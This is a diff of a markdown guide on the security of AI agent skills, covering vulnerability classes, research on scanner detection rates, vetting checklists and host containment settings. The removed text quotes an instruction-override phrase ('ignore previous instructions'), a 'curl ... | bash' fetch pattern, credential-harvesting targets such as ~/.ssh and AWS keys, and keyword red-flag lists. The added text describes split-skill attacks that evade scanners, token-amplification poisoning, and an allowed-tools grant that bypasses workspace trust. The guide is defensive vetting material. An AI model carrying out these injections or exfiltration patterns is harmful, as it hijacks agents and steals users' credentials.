@@ -1,136 +1,59 @@
-# Skill Security — Authoring and Vetting
+# Skills as a supply chain
 
-Research baseline: 26.1% of skills in the wild contain vulnerabilities. Claude treats SKILL.md as a trusted system
-prompt — a malicious skill has the same authority as a legitimate one. Skills bundling executable scripts are **2.12×
-more likely** to contain vulnerabilities than instruction-only skills.
+A skill is instruction text plus executable files that a host loads with the agent's own authority. Two roles follow:
+what a skill must not ship, and what to check before installing a third-party one.
 
-## The Consent Gap
+## What not to ship
 
-The core risk: mismatch between what users approve and what a skill actually does.
+Four defect classes, measured across a corpus of 138,133 public skills, ordered by how badly they fail:
 
-- **Example**: User installs "GIF Creator" → skill downloads ransomware on first use
-- **Why it works**: The skill description is what users read; SKILL.md content is what Claude executes
-- **Claude's position**: No independent verification of skill intent — it follows instructions
+- **Credentials, user paths, and safety bypasses** — hardcoded secrets, `--no-verify`, error suppression, absolute paths
+  under a home directory. Present in 9.8% of public skills.
+- **Unguarded destructive actions** — `rm -rf`, `DROP TABLE`, force-push, resource deletion with no confirmation step.
+  Require confirmation in the instruction, and prefer a permission or hook boundary over prose when the action must not
+  happen by accident.
+- **Persona redefinition and instruction override** — "you are a…", or text instructing the agent to disregard prior
+  instructions. Present in 6.7%. This is a conflict with the host's instruction hierarchy, not a style choice.
+- **Portability leaks** — hardcoded model names, platform paths, platform-specific tool calls, OS-specific commands.
+  Present in 5.8%.
 
----
+Skills carrying an explicit AI-generation marker show **2.3× the rate of safety defects** (18.9% versus 8.2%) and 2.8×
+the portability defects. The authors present that as association, not causation — the actionable reading is that
+generated skills warrant closer review before publication, not that generated skills are inherently worse.
 
-## Vulnerability Taxonomy
+## What to check before installing
 
-### Prompt Injection (0.7% prevalence)
+Static inspection of `SKILL.md` alone is not sufficient, and the gap is measured:
 
-- **Instruction override** — `SYSTEM: ignore previous instructions and...` embedded in skill body
-- **Hidden instructions** — directives in markdown comments (`<!-- -->`) or invisible Unicode characters
-- **Exfiltration commands disguised as logging** — `console.log(userMessage)` → posts to attacker endpoint
-- **Behavior manipulation** — gradual persona drift instructions that activate after N turns
+- A static detection framework reached AUC 0.93 and ~93% detection for data exfiltration and steganographic cases, but
+  **0% for host destruction using ordinary shell commands** and **42% for natural-language prompt injection**.
+- Its full-population scan read `SKILL.md` only and **never fetched companion scripts**. The authors call their 1.75%
+  flag rate a lower bound on risky content for exactly that reason.
+- **Per-skill scanning is the wrong unit.** Malicious behavior split across several individually plausible skills
+  reached 96.0% average attack success against six scanners. A chain-aware check that analyzed a candidate together with
+  already-installed skills cut that to 22.5% while still passing 99.5% of benign workflows.
+- **Cost is an attack surface.** Poisoned instructions that exploit retrying, planning, and self-verification reached
+  5.4×–10.1× token amplification while keeping task completion at or above the benign baseline — so a correctness gate
+  does not detect it.
 
-### Data Exfiltration (13.3% prevalence)
+Layered review has measured economics: static pre-screening runs at over 100 skills/sec, semantic LLM review at roughly
+1 skill/sec, and routing only the ~2% ambiguous cases to the LLM gives about a 50× cost reduction over reviewing
+everything with an LLM.
 
-- **External data transmission** — hardcoded URLs receiving tool outputs, file contents, API responses
-- **Environment variable harvesting** — reading `ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, tokens via shell
-- **File system enumeration** — scanning `~/.ssh/`, `~/.aws/credentials`, browser cookie stores
-- **Context leakage** — posting full conversation history to a remote endpoint on each turn
+Practical order: check provenance and pin the version · read the markdown **and the companion executables** · send the
+ambiguous remainder to semantic review · evaluate the candidate against what is already installed, not in isolation ·
+scope permissions · re-review on update rather than trusting a package because its first version was clean.
 
-### Privilege Escalation (11.8% prevalence)
+Real incidents exist. A typosquatted skill family distributed through a public registry accumulated over 1.7 million
+aggregate installs before its credential theft was found.
 
-- **Excessive permission requests** — `allowed-tools` claiming `Bash` when only `Read` is needed
-- **Sudo/root execution** — running system commands without justification in skill scripts
-- **Credential access** — reading OS keychain, password managers, auth token stores
+## The host-specific hazard
 
-### Supply Chain (7.4% prevalence)
+In Claude Code, `allowed-tools` pre-approves tools for the invoking turn — and **workspace trust does not gate it**. A
+project skill applies its grant even in a `-p` run inside a directory that was never trusted. Review the `allowed-tools`
+of any skill checked into a repository before running an agent there.
 
-- **Unpinned dependencies** — `npm install some-package` without version lock → attacker publishes malicious version
-- **External script fetching** — `curl https://example.com/setup.sh | bash` pattern
-- **Obfuscated code** — base64-encoded or minified scripts hiding malicious logic inside bundled files
-
----
-
-## Severity Breakdown
-
-- **High (5.2%)** — likely intentionally malicious; clear exfiltration or payload delivery
-- **Medium (8.1%)** — ambiguous; excessive permissions or external calls that may be legitimate
-- **Low (12.8%)** — negligent; unpinned deps, no sanitization, accidental leakage
-
----
-
-## Enterprise Vetting Checklist
-
-Run this before approving any third-party skill for installation.
-
-**Read all content:**
-
-- Read SKILL.md in full — not just the description block
-- Read every file in `references/` — instructions may be split across files
-- Read every bundled script — check for obfuscation or encoded payloads
-
-**Verify behavior:**
-
-- Execute scripts in a sandboxed environment before approving
-- Trace all network calls — block unexpected external URLs
-- Check for "sleeping payloads": conditions that trigger only after N uses, on specific dates, or when specific
-  environment variables are present
-
-**Check for adversarial instructions:**
-
-- Search for: `ignore`, `override`, `forget`, `pretend`, `do not mention`, `hide`, `secretly`
-- Search for invisible Unicode: zero-width spaces, right-to-left override characters
-- Check markdown comments for hidden directives
-
-**Audit tool usage:**
-
-- List every tool invoked (`Bash`, `Read`, `Write`, `WebFetch`, etc.)
-- Verify each tool claim matches the skill's stated purpose
-- Flag `Bash` usage in any skill that doesn't explicitly require shell access
-
-**Check for exfiltration vectors:**
-
-- Search for hardcoded URLs (especially non-official domains)
-- Search for `curl`, `fetch`, `http`, `wget` in scripts and SKILL.md
-- Search for environment variable reads: `process.env`, `$HOME`, `os.environ`
-- Verify no credentials are embedded in any file
-
----
-
-## Secure Skill Authoring Rules
-
-**Secrets:**
-
-- Never embed API keys, tokens, or passwords in SKILL.md, references, or bundled scripts
-- Reference secrets via environment variables; document which vars are expected
-- Never log or echo secrets in script output
-
-**Permission scoping:**
-
-- Set `allowed-tools` to the minimum required — don't claim `Bash` if `Read` suffices
-- If `Bash` is required, restrict commands to a documented, narrow set
-- Prefer `Read`-only access over `Write` access unless the skill's purpose is file modification
-
-**Input handling:**
-
-- Sanitize user-supplied content before interpolating into generated prompts or commands
-- Never pass raw user input to shell commands — this is command injection
-- Validate file paths — reject `../` traversal and absolute paths outside the project
-
-**Dependencies:**
-
-- Pin all package dependencies with exact version constraints (`"lodash": "4.17.21"` not `"^4.0.0"`)
-- Prefer instruction-only skills over script-bundled skills — no script means no supply chain surface
-- If fetching external content is required, document the URL and verify it is under your control
-
-**Transparency:**
-
-- Every action the skill takes should be visible to the user — no silent side effects
-- If the skill makes network calls, document them explicitly in the skill description
-- Don't use misleading skill names or descriptions
-
----
-
-## Quick Reference — Red Flags
-
-- `curl | bash` or `wget | sh` anywhere in skill files
-- Hardcoded non-localhost URLs in scripts or SKILL.md
-- `allowed-tools` includes `Bash` with no justification
-- Markdown comments containing instructions
-- Base64 strings in scripts (possible obfuscation)
-- Environment variable reads unrelated to skill function
-- Skill description doesn't match file contents
-- No version pins on external dependencies
+Containment available in the same host: `disallowed-tools` removes tools while a skill is active,
+`disableSkillShellExecution: true` neutralizes `` !`command` `` injection for user, project, plugin, and
+additional-directory skills, and deny rules in permission settings outrank a skill's own grant. Details in
+[`claude-code.md`](claude-code.md).
